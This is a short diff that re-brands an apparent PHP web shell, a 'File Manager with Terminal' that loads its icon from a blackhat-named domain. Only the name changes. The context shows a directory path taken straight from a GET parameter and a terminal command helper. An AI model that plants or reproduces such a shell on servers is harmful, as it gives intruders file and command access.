@@ -1,5 +1,5 @@
 <?php
-// Mr. SpongeBob Ganteng File Manager with Terminal
+// Yanto Tarmizi Ganteng File Manager with Terminal
 $current_dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
 $current_dir = realpath($current_dir);
 
@@ -218,7 +218,7 @@ if ($editing_file && file_exists($editing_file) && is_file($editing_file)) {
 
     <link rel="icon" href="https://tools.sukabumiblackhat.com/es.jpg">
 
-    <title>Mr. SpongeBob Ganteng File Manager</title>
+    <title>Yanto Tarmizi Ganteng File Manager</title>
     <style>
         * {
             margin: 0;
@@ -633,7 +633,7 @@ function insertCommand(cmd) {
 
     <div class="container">
         <div class="header">
-            <h1>ðŸ§½ Mr. SpongeBob Ganteng File Manager</h1>
+            <h1>ðŸ§½ Yanto Tarmizi Ganteng File Manager</h1>
             <div class="current-path">
                 <strong>Current Directory:</strong>
                 <div class="breadcrumb">
